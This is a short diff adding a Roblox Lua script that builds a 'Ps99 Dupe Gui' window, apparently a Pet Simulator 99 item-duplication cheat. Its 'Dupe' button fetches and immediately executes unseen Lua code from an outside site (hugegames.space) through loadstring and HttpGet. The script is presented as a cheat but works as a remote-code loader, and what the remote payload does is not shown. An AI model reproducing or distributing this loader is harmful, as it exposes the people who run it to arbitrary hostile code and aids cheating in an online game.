@@ -1,0 +1,21 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Ps99 Dupe Gui", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+    Name = "Ps99 Dupe Button",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Dupe Button"
+})
+
+Tab:AddButton({
+    Name = "Dupe",
+    Callback = function()
+              loadstring(game:HttpGet('https://hugegames.space/e0bf5cdfb55091d5e059d97d.lua'))()
+      end
+})
+
+OrionLib:Init()
